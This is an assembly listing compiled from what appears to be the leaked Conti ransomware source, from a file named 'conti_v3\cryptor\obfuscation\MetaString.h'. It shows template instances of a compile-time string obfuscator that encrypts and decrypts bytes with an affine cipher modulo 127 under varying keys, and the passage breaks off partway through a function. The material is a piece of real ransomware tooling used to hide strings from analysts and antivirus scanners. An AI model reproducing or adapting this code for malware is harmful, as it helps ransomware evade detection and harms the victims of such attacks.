?encrypt@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 3d	 add	 r8d, 61			; 0000003dH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 6c 00 00 00	 mov	 ecx, 108		; 0000006cH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2c	 imul	 r8d, ecx, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 65	 imul	 r8d, eax, 101		; 00000065H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6c	 add	 r8d, 108		; 0000006cH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GF@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<101,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 39	 sub	 eax, 57			; 00000039H
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 39	 add	 r8d, 57			; 00000039H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 76 00 00 00	 mov	 ecx, 118		; 00000076H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 76	 add	 r8d, 118		; 00000076H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 7b	 sub	 eax, 123		; 0000007bH
  00006	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1f	 imul	 r8d, eax, 31
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 7b	 add	 r8d, 123		; 0000007bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BP@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<31,123,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 1e 00 00 00	 mov	 ecx, 30
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1e	 add	 r8d, 30
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 31	 sub	 eax, 49			; 00000031H
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
